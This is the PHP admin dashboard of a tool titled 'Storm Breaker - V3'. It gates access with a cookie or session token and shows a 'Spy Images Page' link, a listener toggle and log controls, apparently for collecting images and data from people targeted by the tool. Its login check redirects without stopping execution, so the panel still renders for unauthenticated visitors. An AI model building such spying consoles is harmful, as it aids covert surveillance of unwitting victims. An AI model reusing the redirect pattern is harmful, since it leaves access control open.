<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }
        body {
            background: #4d3525;
            min-height: 100vh;
            width: 100vw;
            overflow-x: hidden;
        }
        .admin-container {
            background: #fff;
            margin: 0 auto;
            padding: 2vw 2vw 3vw 2vw;
            border-radius: 10px;
            width: 100vw;
            max-width: 100vw;
            box-shadow: 0 2px 16px #0001;
            min-height: 100vh;
        }
        .admin-container > * {
            box-sizing: border-box;
        }
        .d-flex {
            flex-wrap: wrap;
        }
        .form-control, textarea.form-control {
            width: 100% !important;
            min-width: 0;
            box-sizing: border-box;
        }
        .btn {
            font-size: 1rem;
            padding: 0.5rem 0.8rem;
            margin-bottom: 0.5rem;
        }
        @media (max-width: 600px) {
            .admin-container {
                padding: 2vw 1vw 4vw 1vw;
                width: 100vw;
                min-width: 100vw;
                max-width: 100vw;
                border-radius: 0;
            }
            .btn {
                font-size: 0.98rem;
            }
        }
    </style>
    <title>Storm Breaker - V3</title>

</head>


<body id="ourbody" onload="check_new_version()">

<div class="admin-container">
    <div id="links"></div>
    <div class="d-flex justify-content-center mb-2">
        <a href="spy-images.php" class="btn btn-info mb-3">Spy Images Page</a>
    </div>
    <div class="d-flex justify-content-center mb-2">
        <textarea class="form-control w-100 m-1" placeholder="result ..." id="result" rows="10"></textarea>
    </div>
    <div class="d-flex justify-content-center flex-wrap">
        <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
        <button class="btn btn-success m-2" id="btn-listen" onclick="saveTextAsFile(result.value,'log.txt')">Download Logs</button>
        <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
    </div>
</div>


</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>